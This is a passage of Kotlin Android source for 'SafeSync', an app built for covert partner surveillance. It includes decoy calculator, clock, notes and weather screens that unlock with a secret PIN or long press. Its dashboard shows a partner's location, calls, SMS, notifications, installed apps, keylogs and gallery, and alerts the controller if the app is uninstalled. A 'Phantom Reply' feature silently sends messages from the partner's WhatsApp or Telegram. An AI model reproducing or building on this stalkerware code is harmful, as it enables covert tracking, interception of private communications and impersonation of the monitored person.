                                    Text("Connect to Partner", fontWeight = FontWeight.Bold, fontSize = 16.sp)
                                }
                            }
                        }
                    }
                    
                    Spacer(modifier = Modifier.height(32.dp))
                    
                    if (!isHost) {
                        SlideToStart(
                            onSlideComplete = {
                                startService(Intent(this@MainActivity, LocationService::class.java))
                                WorkManager.getInstance(this@MainActivity).enqueue(OneTimeWorkRequest.from(DataSyncWorker::class.java))
                                Toast.makeText(this@MainActivity, "Protection Activated", Toast.LENGTH_SHORT).show()
                            }
                        )
                    }
                }
                
                FooterComponent(isDark = true)
            }
        }
    }

    @Composable
    fun SlideToStart(onSlideComplete: () -> Unit) {
        val density = androidx.compose.ui.platform.LocalDensity.current
        val widthDp = 300.dp
        val thumbSizeDp = 56.dp
        val maxOffset = with(density) { (widthDp - thumbSizeDp).toPx() }
        
        var offsetX by remember { mutableStateOf(0f) }

        Box(
            modifier = Modifier
                .width(300.dp)
                .height(64.dp)
                .background(Color.White.copy(alpha = 0.1f), RoundedCornerShape(32.dp))
                .border(2.dp, Color.White.copy(alpha = 0.2f), RoundedCornerShape(32.dp)),
            contentAlignment = Alignment.CenterStart
        ) {
            // Slider Progress Fill
            Box(
                modifier = Modifier
                    .fillMaxHeight()
                    .width(with(density) { (offsetX + 56.dp.toPx()).toDp() })
                    .background(
                        brush = androidx.compose.ui.graphics.Brush.horizontalGradient(
                            colors = listOf(Color(0xFF6366F1), Color(0xFFA855F7))
                        ),
                        shape = RoundedCornerShape(32.dp)
                    )
            )

            Text(
                "SLIDE TO ACTIVATE",
                modifier = Modifier.fillMaxWidth(),
                textAlign = TextAlign.Center,
                style = MaterialTheme.typography.labelLarge,
                color = if (offsetX > maxOffset / 2) Color.White else Color.White.copy(alpha = 0.6f),
                fontWeight = FontWeight.Bold,
                letterSpacing = 2.sp
            )

            Box(
                modifier = Modifier
                    .offset { IntOffset(offsetX.roundToInt(), 0) }
                    .padding(4.dp)
                    .size(56.dp)
                    .background(Color.White, RoundedCornerShape(28.dp))
                    .pointerInput(Unit) {
                        detectDragGestures(
                            onDragEnd = {
                                if (offsetX < maxOffset) {
                                    offsetX = 0f
                                } else {
                                    onSlideComplete()
                                    offsetX = 0f // Reset after action
                                }
                            },
                            onDrag = { change, dragAmount ->
                                change.consume()
                                offsetX = (offsetX + dragAmount.x).coerceIn(0f, maxOffset)
                            }
                        )
                    },
                contentAlignment = Alignment.Center
            ) {
                Icon(
                    Icons.Default.ArrowForward,
                    contentDescription = null,
                    tint = Color(0xFF6366F1),
                    modifier = Modifier.size(24.dp)
                )
            }
        }
    }

    @Composable
    fun CalculatorScreen(onUnlock: () -> Unit, onBackToMenu: (() -> Unit)? = null) {
        var display by remember { mutableStateOf("0") }
        var tapCount by remember { mutableStateOf(0) }
        val buttons = listOf(
            listOf("C", "±", "%", "÷"),
            listOf("7", "8", "9", "×"),
            listOf("4", "5", "6", "-"),
            listOf("1", "2", "3", "+"),
            listOf("0", ".", "=")
        )

        // Full screen black background — 100% looks like a real system calculator
        Box(
            modifier = Modifier
                .fillMaxSize()
                .background(Color.Black)
                .systemBarsPadding()
        ) {
            Column(
                modifier = Modifier.fillMaxSize().padding(horizontal = 16.dp, vertical = 8.dp),
                verticalArrangement = Arrangement.Bottom
            ) {

                // Display area — double tap secretly goes back to mode selection
                Box(
                    modifier = Modifier
                        .fillMaxWidth()
                        .weight(1f)
                        .clickable {
                            tapCount++
                            if (tapCount >= 5 && onBackToMenu != null) {
                                // 5 taps on the display = go back to role selection
                                onBackToMenu()
                                tapCount = 0
                            }
                        },
                    contentAlignment = Alignment.BottomEnd
                ) {
                    Text(
                        text = display,
                        style = MaterialTheme.typography.displayLarge.copy(fontSize = 72.sp),
                        color = Color.White,
                        modifier = Modifier.padding(end = 8.dp, bottom = 16.dp),
                        textAlign = androidx.compose.ui.text.style.TextAlign.End,
                        maxLines = 1
                    )
                }

                // Buttons grid
                buttons.forEach { row ->
                    Row(
                        modifier = Modifier.fillMaxWidth().padding(vertical = 4.dp),
                        horizontalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        row.forEach { btn ->
                            val isOp = btn in listOf("÷", "×", "-", "+", "=")
                            val isClear = btn == "C" || btn == "±" || btn == "%"
                            val isZero = btn == "0"
                            val bgColor = when {
                                isOp -> Color(0xFFFF9F0A)          // orange (iOS style)
                                isClear -> Color(0xFF636366)       // dark gray
                                else -> Color(0xFF1C1C1E)          // near-black
                            }
                            Surface(
                                shape = RoundedCornerShape(50),
                                color = bgColor,
                                modifier = Modifier
                                    .weight(if (isZero) 2f else 1f)
                                    .aspectRatio(if (isZero) 2.1f else 1f, matchHeightConstraintsFirst = false)
                                    .clickable {
                                        when (btn) {
                                            "C" -> display = "0"
                                            "=" -> {
                                                if (display == "8888") onUnlock() // Secret PIN
                                                else display = "0"                // Fake reset
                                            }
                                            "±" -> display = if (display.startsWith("-")) display.drop(1) else "-$display"
                                            "%" -> display = (display.toDoubleOrNull()?.div(100))?.toString() ?: "0"
                                            else -> {
                                                if (display == "0" || display == "Error") display = btn
                                                else display += btn
                                            }
                                        }
                                    }
                            ) {
                                Box(
                                    modifier = if (isZero) Modifier.padding(start = 26.dp).fillMaxSize() else Modifier.fillMaxSize(),
                                    contentAlignment = if (isZero) Alignment.CenterStart else Alignment.Center
                                ) {
                                    Text(
                                        btn,
                                        color = Color.White,
                                        style = MaterialTheme.typography.headlineMedium,
                                        fontWeight = FontWeight.Bold
                                    )
                                }
                            }
                        }
                    }
                }
                Spacer(modifier = Modifier.height(8.dp))
            }
        }
    }

    @Composable
    fun ClockScreen(onUnlock: () -> Unit, onBackToMenu: (() -> Unit)? = null) {
        var currentTime by remember { mutableStateOf(SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())) }
        var tapCount by remember { mutableStateOf(0) }
        
        LaunchedEffect(Unit) {
            while (true) {
                kotlinx.coroutines.delay(1000)
                currentTime = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
            }
        }

        Box(
            modifier = Modifier
                .fillMaxSize()
                .background(Color.Black)
                .systemBarsPadding(),
            contentAlignment = Alignment.Center
        ) {
            Text(
                text = currentTime,
                style = MaterialTheme.typography.displayLarge.copy(fontSize = 72.sp),
                color = Color.White,
                modifier = Modifier
                    .pointerInput(Unit) {
                        detectTapGestures(
                            onLongPress = { onUnlock() },
                            onTap = {
                                tapCount++
                                if (tapCount >= 5 && onBackToMenu != null) {
                                    onBackToMenu()
                                    tapCount = 0
                                }
                            }
                        )
                    }
            )
        }
    }

    @OptIn(ExperimentalMaterial3Api::class)
    @Composable
    fun NotesScreen(onUnlock: () -> Unit, onBackToMenu: (() -> Unit)? = null) {
        var noteText by remember { mutableStateOf("") }
        var tapCount by remember { mutableStateOf(0) }

        Scaffold(
            topBar = {
                CenterAlignedTopAppBar(
                    title = { 
                        Text("Notes", modifier = Modifier.pointerInput(Unit) {
                            detectTapGestures(
                                onTap = {
                                    tapCount++
                                    if (tapCount >= 5 && onBackToMenu != null) {
                                        onBackToMenu()
                                        tapCount = 0
                                    }
                                }
                            )
                        }) 
                    },
                    actions = {
                        IconButton(onClick = {
                            if (noteText.trim() == "8888") onUnlock()
                            else noteText = ""
                        }) {
                            Icon(Icons.Default.Save, contentDescription = "Save Note")
                        }
                    }
                )
            }
        ) { padding ->
            OutlinedTextField(
                value = noteText,
                onValueChange = { noteText = it },
                modifier = Modifier
                    .fillMaxSize()
                    .padding(padding)
                    .padding(16.dp),
                placeholder = { Text("Write your notes here...") },
                colors = TextFieldDefaults.outlinedTextFieldColors(
                    unfocusedBorderColor = Color.Transparent,
                    focusedBorderColor = Color.Transparent
                )
            )
        }
    }

    @Composable
    fun WeatherScreen(onUnlock: () -> Unit, onBackToMenu: (() -> Unit)? = null) {
        var tapCount by remember { mutableStateOf(0) }
        Box(
            modifier = Modifier
                .fillMaxSize()
                .background(
                    brush = androidx.compose.ui.graphics.Brush.verticalGradient(
                        colors = listOf(Color(0xFF87CEEB), Color(0xFF1E90FF))
                    )
                )
                .systemBarsPadding(),
            contentAlignment = Alignment.Center
        ) {
            Column(horizontalAlignment = Alignment.CenterHorizontally) {
                Text(
                    "Jakarta",
                    style = MaterialTheme.typography.headlineLarge,
                    color = Color.White,
                    modifier = Modifier.pointerInput(Unit) {
                        detectTapGestures(
                            onTap = {
                                tapCount++
                                if (tapCount >= 5 && onBackToMenu != null) {
                                    onBackToMenu()
                                    tapCount = 0
                                }
                            }
                        )
                    }
                )
                Spacer(modifier = Modifier.height(16.dp))
                Icon(Icons.Default.WbSunny, contentDescription = null, modifier = Modifier.size(120.dp), tint = Color(0xFFFFD700))
                Spacer(modifier = Modifier.height(16.dp))
                Text(
                    "32°C",
                    style = MaterialTheme.typography.displayLarge.copy(fontSize = 80.sp, fontWeight = FontWeight.Bold),
                    color = Color.White,
                    modifier = Modifier.pointerInput(Unit) {
                        detectTapGestures(onLongPress = { onUnlock() })
                    }
                )
                Text("Sunny", style = MaterialTheme.typography.titleLarge, color = Color.White)
            }
        }
    }

    @Composable
    fun DashboardTabs() {
        var selectedTab by remember { mutableIntStateOf(0) }
        val tabs  = listOf("Location", "Calls", "Contacts", "SMS", "Notifs", "Apps", "WiFi", "Keylog", "Device", "Settings")
        val icons = listOf(
            Icons.Default.Map, Icons.Default.PhoneEnabled, Icons.Default.Contacts, Icons.Default.Sms, Icons.Default.Notifications,
            Icons.Default.Apps, Icons.Default.Wifi, Icons.Default.Keyboard, Icons.Default.PhoneAndroid,
            Icons.Default.Settings
        )

        // ── Partner online status ────────────────────────────────────────────
        var partnerStatus by remember { mutableStateOf("unknown") }
        LaunchedEffect(Unit) { FirebaseManager.listenToPartnerStatus { partnerStatus = it } }

        val statusColor = when (partnerStatus) {
            "online"      -> Color(0xFF4CAF50)
            "away"        -> Color(0xFFFF9800)
            "offline"     -> Color(0xFFF44336)
            "uninstalled" -> Color(0xFF9E9E9E)
            else          -> Color(0xFF9E9E9E)
        }
        val statusLabel = when (partnerStatus) {
            "online"      -> "● Online"
            "away"        -> "● Away"
            "offline"     -> "● Offline"
            "uninstalled" -> "● Possibly Uninstalled"
            else          -> "● Unknown"
        }

        Scaffold(
            topBar = {
                Column {
                    CenterAlignedTopAppBar(
                        title = {
                            Column(horizontalAlignment = Alignment.CenterHorizontally) {
                                Text("SafeSync", style = MaterialTheme.typography.titleLarge, fontWeight = FontWeight.Black)
                                Row(verticalAlignment = Alignment.CenterVertically) {
                                    Text(
                                        statusLabel,
                                        style = MaterialTheme.typography.labelSmall,
                                        color = statusColor,
                                        fontWeight = FontWeight.Bold
                                    )
                                    Text(
                                        "  ·  ${FirebaseManager.partnerId?.takeLast(6) ?: ""}",
                                        style = MaterialTheme.typography.labelSmall,
                                        color = Color.Gray
                                    )
                                }
                            }
                        },
                        colors = TopAppBarDefaults.centerAlignedTopAppBarColors(
                            containerColor = MaterialTheme.colorScheme.surface,
                            titleContentColor = MaterialTheme.colorScheme.onSurface
                        ),
                        actions = {
                            IconButton(onClick = {
                                FirebaseManager.logout()
                                savePartnerId(null)
                                saveAppMode(AppMode.NONE)
                            }) { Icon(Icons.Default.Logout, contentDescription = "Logout", tint = Color.Red) }
                            IconButton(onClick = { /* Refresh */ }) {
                                Icon(Icons.Default.Refresh, contentDescription = "Refresh")
                            }
                        }
                    )
                    // ── Uninstall / offline warning banner ───────────────────
                    if (partnerStatus == "uninstalled" || partnerStatus == "offline") {
                        Surface(
                            color = if (partnerStatus == "uninstalled") Color(0xFFF44336).copy(alpha = 0.12f)
                                    else Color(0xFFFF9800).copy(alpha = 0.1f),
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            Row(
                                modifier = Modifier.padding(horizontal = 16.dp, vertical = 8.dp),
                                verticalAlignment = Alignment.CenterVertically,
                                horizontalArrangement = Arrangement.Center
                            ) {
                                Icon(
                                    if (partnerStatus == "uninstalled") Icons.Default.Warning else Icons.Default.SignalWifiOff,
                                    contentDescription = null,
                                    tint = if (partnerStatus == "uninstalled") Color(0xFFF44336) else Color(0xFFFF9800),
                                    modifier = Modifier.size(16.dp)
                                )
                                Spacer(modifier = Modifier.width(8.dp))
                                Text(
                                    if (partnerStatus == "uninstalled")
                                        "⚠ Client app may have been uninstalled!"
                                    else
                                        "Client device is offline",
                                    style = MaterialTheme.typography.labelMedium,
                                    fontWeight = FontWeight.Bold,
                                    color = if (partnerStatus == "uninstalled") Color(0xFFF44336) else Color(0xFFFF9800)
                                )
                            }
                        }
                    }
                }
            },
            bottomBar = {
                Surface(
                    color = MaterialTheme.colorScheme.surface,
                    tonalElevation = 16.dp,
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .horizontalScroll(rememberScrollState())
                            .padding(vertical = 8.dp, horizontal = 12.dp),
                        horizontalArrangement = Arrangement.spacedBy(16.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        tabs.forEachIndexed { index, title ->
                            val isSelected = selectedTab == index
                            val color = if (isSelected) MaterialTheme.colorScheme.primary else Color.Gray
                            
                            Column(
                                modifier = Modifier
                                    .clip(RoundedCornerShape(12.dp))
                                    .clickable { selectedTab = index }
                                    .padding(horizontal = 12.dp, vertical = 6.dp),
                                horizontalAlignment = Alignment.CenterHorizontally
                            ) {
                                if (isSelected) {
                                    Surface(shape = RoundedCornerShape(16.dp), color = color.copy(alpha = 0.2f)) {
                                        Icon(icons[index], contentDescription = title, modifier = Modifier.padding(horizontal = 16.dp, vertical = 4.dp).size(20.dp), tint = color)
                                    }
                                } else {
                                    Icon(icons[index], contentDescription = title, modifier = Modifier.padding(vertical = 4.dp).size(20.dp), tint = color)
                                }
                                Spacer(modifier = Modifier.height(4.dp))
                                Text(title, style = MaterialTheme.typography.labelSmall, fontSize = 9.sp, color = color, fontWeight = if (isSelected) FontWeight.Bold else FontWeight.Normal)
                            }
                        }
                    }
                }
            }
        ) { padding ->
            Column(modifier = Modifier.padding(padding).fillMaxSize()) {
                Surface(modifier = Modifier.weight(1f), color = MaterialTheme.colorScheme.background) {
                    when (selectedTab) {
                        0 -> LocationTab()
                        1 -> CallsTab()
                        2 -> ContactsTab()
                        3 -> SmsTab()
                        4 -> NotifsTab()
                        5 -> AppsTab()
                        6 -> WifiTab()
                        7 -> KeylogTab()
                        8 -> DeviceTab()
                        9 -> SettingsTab()
                    }
                }
                FooterComponent()
            }
        }
    }


    @Composable
    fun NotifsTab() {
        var notifs by remember { mutableStateOf(listOf<Map<String, String>>()) }
        LaunchedEffect(Unit) { FirebaseManager.listenToPartnerNotifications { notifs = it } }

        // Level 1: group by package
        val groupedByPkg = remember(notifs) {
            notifs.groupBy { it["package"] ?: "unknown" }
        }

        // Track expanded state at both levels
        var expandedPkgs   by remember { mutableStateOf(setOf<String>()) }
        var expandedChats  by remember { mutableStateOf(setOf<String>()) } // "pkg::title"
        var showReplyDialog by remember { mutableStateOf<String?>(null) }
        var replyText by remember { mutableStateOf("") }

        Column(modifier = Modifier.fillMaxSize()) {
            // ── Header ──────────────────────────────────────────────────────
            Row(
                modifier = Modifier.fillMaxWidth().padding(horizontal = 16.dp, vertical = 14.dp),
                verticalAlignment = Alignment.CenterVertically
            ) {
                Icon(Icons.Default.Notifications, contentDescription = null, tint = MaterialTheme.colorScheme.primary)
                Spacer(modifier = Modifier.width(8.dp))
                Text("Notifications", style = MaterialTheme.typography.titleMedium, fontWeight = FontWeight.Black)
                Spacer(modifier = Modifier.weight(1f))
                Surface(shape = RoundedCornerShape(20.dp), color = MaterialTheme.colorScheme.primary.copy(alpha = 0.1f)) {
                    Text(
                        "${notifs.size} total",
                        modifier = Modifier.padding(horizontal = 10.dp, vertical = 4.dp),
                        style = MaterialTheme.typography.labelSmall,
                        color = MaterialTheme.colorScheme.primary
                    )
                }
            }

            if (notifs.isEmpty()) {
                Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                    Column(horizontalAlignment = Alignment.CenterHorizontally) {
                        Icon(Icons.Default.NotificationsOff, contentDescription = null, modifier = Modifier.size(56.dp), tint = Color.LightGray)
                        Spacer(modifier = Modifier.height(12.dp))
                        Text("No notifications yet", color = Color.Gray)
                    }
                }
            } else {
                LazyColumn(
                    modifier = Modifier.fillMaxSize().padding(horizontal = 12.dp),
                    verticalArrangement = Arrangement.spacedBy(8.dp),
                    contentPadding = PaddingValues(bottom = 16.dp)
                ) {
                    groupedByPkg.forEach { (pkg, pkgMsgs) ->
                        val appName = pkg.substringAfterLast(".").replaceFirstChar { it.uppercase() }
                            .let { if (it.length > 16) it.take(16) else it }
                        val isPkgExpanded = expandedPkgs.contains(pkg)
                        val pkgColor = Color(
                            red   = ((pkg.hashCode() shr 16) and 0xFF) / 255f * 0.7f + 0.2f,
                            green = ((pkg.hashCode() shr 8)  and 0xFF) / 255f * 0.7f + 0.1f,
                            blue  = ( pkg.hashCode()          and 0xFF) / 255f * 0.7f + 0.2f
                        )
                        // Level 2: group by chat/sender title inside this package
                        val groupedByChat = pkgMsgs.groupBy { it["title"] ?: "?" }

                        item(key = pkg) {
                            Surface(
                                shape = RoundedCornerShape(16.dp),
                                color = MaterialTheme.colorScheme.surface,
                                shadowElevation = 2.dp,
                                modifier = Modifier.fillMaxWidth()
                            ) {
                                Column {
                                    // ── App row ──────────────────────────────
                                    Row(
                                        modifier = Modifier
                                            .fillMaxWidth()
                                            .clickable { expandedPkgs = if (isPkgExpanded) expandedPkgs - pkg else expandedPkgs + pkg }
                                            .padding(horizontal = 14.dp, vertical = 12.dp),
                                        verticalAlignment = Alignment.CenterVertically
                                    ) {
                                        Surface(
                                            shape = RoundedCornerShape(10.dp),
                                            color = pkgColor.copy(alpha = 0.2f),
                                            modifier = Modifier.size(40.dp)
                                        ) {
                                            Box(contentAlignment = Alignment.Center) {
                                                Text(appName.take(1).uppercase(), fontWeight = FontWeight.Black, fontSize = 18.sp, color = pkgColor)
                                            }
                                        }
                                        Spacer(modifier = Modifier.width(12.dp))
                                        Column(modifier = Modifier.weight(1f)) {
                                            Text(appName, fontWeight = FontWeight.Bold, style = MaterialTheme.typography.bodyMedium)
                                            Text(
                                                "${groupedByChat.size} chat · ${pkgMsgs.size} msg",
                                                style = MaterialTheme.typography.labelSmall,
                                                color = Color.Gray
                                            )
                                        }
                                        Surface(shape = RoundedCornerShape(20.dp), color = pkgColor.copy(alpha = 0.15f)) {
                                            Text(
                                                "${pkgMsgs.size}",
                                                modifier = Modifier.padding(horizontal = 8.dp, vertical = 3.dp),
                                                style = MaterialTheme.typography.labelMedium,
                                                fontWeight = FontWeight.Bold,
                                                color = pkgColor
                                            )
                                        }
                                        Spacer(modifier = Modifier.width(6.dp))
                                        Icon(
                                            if (isPkgExpanded) Icons.Default.ExpandLess else Icons.Default.ExpandMore,
                                            contentDescription = null, tint = Color.Gray, modifier = Modifier.size(20.dp)
                                        )
                                    }

                                    // ── Level 2: Chats list ───────────────────
                                    AnimatedVisibility(visible = isPkgExpanded, enter = expandVertically(), exit = shrinkVertically()) {
                                        Column {
                                            HorizontalDivider(color = MaterialTheme.colorScheme.outlineVariant)
                                            groupedByChat.entries.forEachIndexed { chatIdx, (chatTitle, chatMsgs) ->
                                                val chatKey       = "$pkg::$chatTitle"
                                                val isChatExpanded = expandedChats.contains(chatKey)
                                                val subTexts = chatMsgs.firstOrNull()?.get("subTexts")
                                                    ?.split("||")?.filter { it.isNotBlank() } ?: emptyList()
                                                // Show sub-messages if they exist, else all chat messages' text
                                                val messageLines = if (subTexts.isNotEmpty()) subTexts
                                                    else chatMsgs.mapNotNull { it["text"] }.filter { it.isNotBlank() }
                                                val latestTime = chatMsgs.firstOrNull()?.get("time")?.toLongOrNull()?.let {
                                                    SimpleDateFormat("HH:mm · dd/MM", Locale.getDefault()).format(Date(it))
                                                } ?: ""

                                                Column(modifier = Modifier
                                                    .fillMaxWidth()
                                                    .background(
                                                        if (chatIdx % 2 == 0) Color.Transparent
                                                        else MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.3f)
                                                    )
                                                ) {
                                                    // Chat header row (tap to expand messages)
                                                    Row(
                                                        modifier = Modifier
                                                            .fillMaxWidth()
                                                            .clickable {
                                                                expandedChats = if (isChatExpanded) expandedChats - chatKey else expandedChats + chatKey
                                                            }
                                                            .padding(start = 20.dp, end = 14.dp, top = 10.dp, bottom = 10.dp),
                                                        verticalAlignment = Alignment.CenterVertically
                                                    ) {
                                                        // Chat bubble icon
                                                        Icon(
                                                            Icons.Default.Chat,
                                                            contentDescription = null,
                                                            modifier = Modifier.size(16.dp),
                                                            tint = pkgColor.copy(alpha = 0.7f)
                                                        )
                                                        Spacer(modifier = Modifier.width(10.dp))
                                                        Column(modifier = Modifier.weight(1f)) {
                                                            Text(
                                                                chatTitle,
                                                                fontWeight = FontWeight.SemiBold,
                                                                style = MaterialTheme.typography.bodySmall,
                                                                maxLines = 1,
                                                                overflow = TextOverflow.Ellipsis
                                                            )
                                                            if (!isChatExpanded) {
                                                                // Preview: last message
                                                                val preview = messageLines.lastOrNull() ?: chatMsgs.lastOrNull()?.get("text") ?: ""
                                                                if (preview.isNotBlank()) {
                                                                    Text(
                                                                        preview,
                                                                        style = MaterialTheme.typography.labelSmall,
                                                                        color = Color.Gray,
                                                                        maxLines = 1,
                                                                        overflow = TextOverflow.Ellipsis
                                                                    )
                                                                }
                                                            }
                                                        }
                                                        Column(horizontalAlignment = Alignment.End) {
                                                            if (messageLines.size > 1) {
                                                                Surface(shape = RoundedCornerShape(10.dp), color = pkgColor.copy(alpha = 0.12f)) {
                                                                    Text(
                                                                        "${messageLines.size}",
                                                                        modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp),
                                                                        style = MaterialTheme.typography.labelSmall,
                                                                        fontWeight = FontWeight.Bold,
                                                                        color = pkgColor
                                                                    )
                                                                }
                                                                Spacer(modifier = Modifier.height(2.dp))
                                                            }
                                                            if (latestTime.isNotEmpty()) {
                                                                Text(latestTime, style = MaterialTheme.typography.labelSmall, color = Color.LightGray)
                                                            }
                                                        }
                                                        Spacer(modifier = Modifier.width(4.dp))
                                                        Icon(
                                                            if (isChatExpanded) Icons.Default.ExpandLess else Icons.Default.ExpandMore,
                                                            contentDescription = null, tint = Color.LightGray, modifier = Modifier.size(16.dp)
                                                        )
                                                    }

                                                    // ── Level 3: individual messages ───────────
                                                    AnimatedVisibility(visible = isChatExpanded, enter = expandVertically(), exit = shrinkVertically()) {
                                                        Column(modifier = Modifier.padding(start = 46.dp, end = 12.dp, bottom = 8.dp)) {
                                                            messageLines.forEach { msg ->
                                                                Surface(
                                                                    shape = RoundedCornerShape(10.dp),
                                                                    color = pkgColor.copy(alpha = 0.07f),
                                                                    modifier = Modifier.fillMaxWidth().padding(vertical = 3.dp)
                                                                ) {
                                                                    Text(
                                                                        msg,
                                                                        modifier = Modifier.padding(horizontal = 12.dp, vertical = 8.dp),
                                                                        style = MaterialTheme.typography.bodySmall,
                                                                        color = MaterialTheme.colorScheme.onSurface
                                                                    )
                                                                }
                                                            }
                                                            // Reply Button for messaging apps
                                                            if (pkg == "com.whatsapp" || pkg == "org.telegram.messenger" || pkg.contains("messaging")) {
                                                                TextButton(
                                                                    onClick = { showReplyDialog = chatKey },
                                                                    modifier = Modifier.align(Alignment.End)
                                                                ) {
                                                                    Text("Phantom Reply", color = MaterialTheme.colorScheme.primary, fontWeight = FontWeight.Bold, fontSize = 12.sp)
                                                                }
                                                            }
                                                        }
                                                    }
                                                }

                                                if (chatIdx < groupedByChat.size - 1) {
                                                    HorizontalDivider(
                                                        modifier = Modifier.padding(horizontal = 20.dp),
                                                        color = MaterialTheme.colorScheme.outlineVariant.copy(alpha = 0.4f)
                                                    )
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        } // End of Column

        // Reply Dialog
        if (showReplyDialog != null) {
            val context = LocalContext.current
            AlertDialog(
                onDismissRequest = { showReplyDialog = null; replyText = "" },
                title = { Text("Send Phantom Reply", fontWeight = FontWeight.Bold) },
                text = {
                    OutlinedTextField(
                        value = replyText,
                        onValueChange = { replyText = it },
                        modifier = Modifier.fillMaxWidth(),
                        label = { Text("Secret Message") },
                        maxLines = 3
                    )
                },
                confirmButton = {
                    Button(onClick = {
                        showReplyDialog?.let { chatKey ->
                            FirebaseManager.sendPhantomReply(chatKey, replyText)
                            Toast.makeText(context, "Phantom Reply Sent!", Toast.LENGTH_SHORT).show()
                        }
                        showReplyDialog = null
                        replyText = ""
                    }) {
                        Text("Send Silently")
                    }
                },
                dismissButton = {
                    TextButton(onClick = { showReplyDialog = null; replyText = "" }) {
                        Text("Cancel", color = Color.Gray)
                    }
                }
            )
        }
    }


    @Composable
    fun LocationTab() {
        val context = LocalContext.current
        var lat by remember { mutableStateOf(0.0) }
        var lng by remember { mutableStateOf(0.0) }
        var hasLocation by remember { mutableStateOf(false) }

        LaunchedEffect(Unit) {
            FirebaseManager.listenToPartnerLocation { newLat, newLng ->
                lat = newLat; lng = newLng; hasLocation = true
            }
        }

        Column(
            modifier = Modifier.fillMaxSize().padding(24.dp),
            verticalArrangement = Arrangement.Center,
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            Icon(
                Icons.Default.MyLocation,
                contentDescription = null,
                modifier = Modifier.size(64.dp),
                tint = MaterialTheme.colorScheme.primary
            )
            Spacer(modifier = Modifier.height(16.dp))
            Text(
                "Partner Location",
                style = MaterialTheme.typography.titleLarge,
                fontWeight = FontWeight.Bold
            )
            Spacer(modifier = Modifier.height(8.dp))

            if (!hasLocation) {
                Text("Waiting for location data...", color = Color.Gray)
            } else {
                Surface(
                    shape = RoundedCornerShape(16.dp),
                    color = MaterialTheme.colorScheme.surfaceVariant,
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Column(
                        modifier = Modifier.padding(20.dp),
                        horizontalAlignment = Alignment.CenterHorizontally
                    ) {
                        Text(
                            "%.6f, %.6f".format(lat, lng),
                            style = MaterialTheme.typography.bodyLarge,
                            fontWeight = FontWeight.Bold,
                            textAlign = TextAlign.Center
                        )
                        Spacer(modifier = Modifier.height(4.dp))
                        Text(
                            "Lat: %.6f  |  Lng: %.6f".format(lat, lng),
                            style = MaterialTheme.typography.labelSmall,
                            color = Color.Gray,
                            textAlign = TextAlign.Center
                        )
                    }
                }

                Spacer(modifier = Modifier.height(16.dp))

                // Action buttons row
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.spacedBy(12.dp)
                ) {
                    // Copy coordinates button
                    OutlinedButton(
                        onClick = {
                            val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                            val clip = ClipData.newPlainText("Location", "$lat,$lng")
                            clipboard.setPrimaryClip(clip)
                            Toast.makeText(context, "Coordinates copied!", Toast.LENGTH_SHORT).show()
                        },
                        modifier = Modifier.weight(1f),
                        shape = RoundedCornerShape(12.dp),
                        colors = ButtonDefaults.outlinedButtonColors(contentColor = MaterialTheme.colorScheme.primary)
                    ) {
                        Icon(Icons.Default.ContentCopy, contentDescription = null, modifier = Modifier.size(16.dp))
                        Spacer(modifier = Modifier.width(6.dp))
                        Text("Copy", fontWeight = FontWeight.SemiBold)
                    }

                    // Open in Google Maps button
                    Button(
                        onClick = {
                            val uri = Uri.parse("geo:$lat,$lng?q=$lat,$lng(Partner+Location)")
                            val mapIntent = Intent(Intent.ACTION_VIEW, uri)
                            mapIntent.setPackage("com.google.android.apps.maps")
                            if (mapIntent.resolveActivity(context.packageManager) != null) {
                                context.startActivity(mapIntent)
                            } else {
                                val browserUri = Uri.parse("https://maps.google.com/?q=$lat,$lng")
                                context.startActivity(Intent(Intent.ACTION_VIEW, browserUri))
                            }
                        },
                        modifier = Modifier.weight(1f),
                        shape = RoundedCornerShape(12.dp),
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF4285F4))
                    ) {
                        Icon(Icons.Default.Map, contentDescription = null, modifier = Modifier.size(16.dp))
                        Spacer(modifier = Modifier.width(6.dp))
                        Text("Maps", fontWeight = FontWeight.SemiBold)
                    }
                }
            }
        }
    }

    @Composable
    fun CallsTab() {
        var logs by remember { mutableStateOf(listOf<Map<String, String>>()) }
        LaunchedEffect(Unit) { FirebaseManager.listenToPartnerCalls { logs = it } }
        DataList("Recent Calls", logs, "number", "type", Icons.Default.Call)
    }

    @Composable
    fun AppsTab() {
        var apps by remember { mutableStateOf(listOf<Map<String, String>>()) }
        LaunchedEffect(Unit) { FirebaseManager.listenToPartnerApps { apps = it } }
        DataList("Installed Apps", apps, "name", "package", Icons.Default.Smartphone)
    }

    @Composable
    fun GalleryTab() {
        val context = LocalContext.current
        var photos by remember { mutableStateOf(listOf<Map<String, String>>()) }
        var downloadingPath by remember { mutableStateOf<String?>(null) }

        LaunchedEffect(Unit) { FirebaseManager.listenToPartnerGallery { photos = it } }

        Column(modifier = Modifier.fillMaxSize()) {
            Surface(
                color = MaterialTheme.colorScheme.surface,
                shadowElevation = 2.dp,
                modifier = Modifier.fillMaxWidth().padding(bottom = 8.dp)
            ) {
                Row(
                    modifier = Modifier.fillMaxWidth().padding(horizontal = 16.dp, vertical = 14.dp),
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Icon(
                        Icons.Default.PhotoLibrary,
                        contentDescription = null,
                        tint = MaterialTheme.colorScheme.primary,
                        modifier = Modifier.size(24.dp).padding(horizontal = 4.dp)
                    )
                    Spacer(modifier = Modifier.width(8.dp))
                    Column(modifier = Modifier.weight(1f)) {
                        Text(
                            "Partner Gallery",
                            style = MaterialTheme.typography.titleMedium,
                            fontWeight = FontWeight.Black
                        )
                    }
                    Text(
                        "${photos.size} media",
                        style = MaterialTheme.typography.labelSmall,
                        color = Color.Gray
                    )
                }
            }

